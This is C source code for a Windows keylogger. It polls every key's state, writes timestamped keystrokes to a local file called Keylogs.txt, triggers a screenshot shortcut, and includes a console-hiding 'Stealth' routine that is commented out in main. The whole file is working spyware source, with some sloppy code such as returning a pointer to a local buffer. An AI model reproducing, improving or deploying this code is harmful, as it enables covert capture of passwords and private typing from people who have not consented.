#include <Windows.h>
//#include <fstream>
#include <stdio.h>
#include <string.h>
#include <time.h>
#include <stdbool.h>
const char * timestamp()
{
   			char temp_time[20];
   			char Time[30]="";
   			strcat(Time,"\n");
			time_t now = time(NULL);
			strftime(temp_time, 20, "%Y-%m-%d %H:%M:%S", localtime(&now));
			strcat(Time,temp_time);
			strcat(Time,":");
			return Time;
}
void WriteData(char Text[])
{

	int i;
	FILE *fp;
	fp=fopen("Keylogs.txt","a");
	fprintf(fp,Text);
	fclose(fp);
}

void Screenshot()
{
		
		
		
		keybd_event(VK_LWIN, 0, 0, 0);
		keybd_event(VK_SNAPSHOT, 0, 0, 0); //PrntScrn Press


    	keybd_event(VK_SNAPSHOT, 0, KEYEVENTF_KEYUP, 0); //PrntScrn Release
    	keybd_event(VK_LWIN,0,KEYEVENTF_KEYUP, 0);
		
		
}


void Stealth() {
	HWND hWnd;
	AllocConsole();
	hWnd = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(hWnd, 0);
}
bool isKeyListed(int vKey) {
	switch (vKey) {
	case VK_RETURN:
		WriteData("\n");
		break;
	case VK_BACK:
		WriteData("\b");
		break;
	case VK_SPACE:
		WriteData("\0");
		break;
	case VK_SHIFT:
		WriteData(" *shift* ");
		break;
	case VK_OEM_PERIOD:
		WriteData(".");
		break;
	case VK_TAB:
		WriteData(" *TAB* ");
		break;
	case VK_CONTROL:
		WriteData(" *CTRL*");
		break;
	case VK_MENU:
		WriteData(" *ALT* ");
		break;
	case VK_CAPITAL:
		WriteData(" *Caps Lock* ");
		break;
	case VK_ESCAPE:
		WriteData(" *ESC* ");
		break;
	case VK_LEFT:
		WriteData(" *LEFT ARROW* ");
		break;
		case VK_UP:
		WriteData(" *UP ARROW* ");
		break;
	case VK_RIGHT:
		WriteData(" *RIGHT ARROW* ");
		break;
	case VK_DOWN:
		WriteData(" *DOWN ARROW* ");
		break;
	case VK_DELETE:
		WriteData(" *DEL* ");
		break;
	case VK_NUMPAD0:
		WriteData("0");
		break;
	case VK_NUMPAD1:
		WriteData("1");
		break;
	case VK_NUMPAD2:
		WriteData("2");
		break;
	case VK_NUMPAD3:
		WriteData("3");
		break;
	case VK_NUMPAD4:
		WriteData("4");
		break;
	case VK_NUMPAD5:
		WriteData("5");
		break;
	case VK_NUMPAD6:
		WriteData("6");
		break;
	case VK_NUMPAD7:
		WriteData("7");
		break;
	case VK_NUMPAD8:
		WriteData("8");
		break;
	case VK_NUMPAD9:
		WriteData("9");
		break;
	case VK_F1:
		WriteData(" *F1* ");
		break;
	case VK_F2:
		WriteData(" *F2* ");
		break;
	case VK_F3:
		WriteData(" *F3* ");
		break;
	case VK_F4:
		WriteData(" *F4* ");
		break;
	case VK_F5:
		WriteData(" *F5* ");
		break;
	case VK_F6:
		WriteData(" *F6* ");
		break;
	case VK_F7:
		WriteData(" *F7* ");
		break;
	case VK_F8:
		WriteData(" *F8* ");
		break;
	case VK_F9:
		WriteData(" *F9* ");
		break;
	case VK_F10:
		WriteData(" *F10* ");
		break;
	case VK_F11:
		WriteData(" *F11* ");
		break;
	case VK_F12:
		WriteData(" *F12* ");
		break;
	case VK_SEPARATOR:
		WriteData(",");
		break;
	case VK_SUBTRACT:
		WriteData("-");
		break;
	case VK_DECIMAL:
		WriteData(".");
		break;
	case VK_DIVIDE:
		WriteData("/");
		break;
	case VK_MULTIPLY:
		WriteData("*");
		break;
	case VK_ADD:
		WriteData("+");
		break;
		
	default: return false;
	}
}

int main() {
//	Stealth();
	char Key;
	Screenshot();
	char temp_time[20];
	char time[20];
	strcpy(temp_time,timestamp());
	WriteData(temp_time);
		
							
	while (1) {
		for (Key = 8; Key <= 255; Key++) {
			if (GetAsyncKeyState(Key) == -32767) {
				if (isKeyListed(Key) == 0) {
					//if((GetAsyncKeyState(VK_SHIFT) & 0x8000)!=0)   /shift ON
					//if(GetKeyState(VK_CAPITAL) & 0x0001)!=0)   //caps ON
					if ((((GetKeyState(VK_CAPITAL) & 0x0001)!=0)&&((GetKeyState(VK_SHIFT) & 0x8000)==0))||(((GetKeyState(VK_SHIFT) & 0x8000)!=0)&&((GetKeyState(VK_CAPITAL) & 0x0001)==0)))
					{
						//UPPER CASE
						Key=toupper(Key);					
					}
					else
					{
						//LOWER CASE
						Key=tolower(Key);
					}
					//printf("%c",Key);
					
					strcpy(time,timestamp());  //Checking if the time has changed or not
					if(strcmp(temp_time,time)!=0)
					{
						WriteData(time);
						strcpy(temp_time,time);
					}
				
		
					FILE *fp;
					fp=fopen("Keylogs.txt","a ");
					fputc(Key,fp);
					fclose(fp);
					
				}
			}
		}
	}
}
